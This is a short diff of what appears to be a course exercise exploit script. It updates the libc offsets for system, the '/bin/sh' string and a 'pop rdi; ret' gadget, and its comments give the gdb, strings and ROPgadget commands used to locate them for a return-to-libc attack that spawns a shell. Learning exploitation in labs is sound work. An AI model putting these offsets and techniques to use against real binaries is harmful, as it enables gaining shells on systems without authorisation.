@@ -13,12 +13,12 @@ DIFFICULTY_LEVEL = {
     "HARD": b"1",
 }
 
-# Offsets
-# np. "gdb /lib/x86_64-linux-gnu/libc.so.6" i polecenie "p/x &system"
+# Offsets (commands entirely from zad5_to_libc_system.py with minor changes)
+# "gdb ./libc.so.6" then "p/x &system"
 SYSTEM_OFF = 0x55230
-# strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep '/bin/sh'
+# strings -tx ./libc.so.6 | grep '/bin/sh'
 BIN_SH_OFF = 0x1c041b
-# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep 'pop rdi'
+# ROPgadget --binary ./libc.so.6 | grep 'pop rdi'
 POP_RDI_OFF = 0x28715  # pop rdi ; ret
 
 
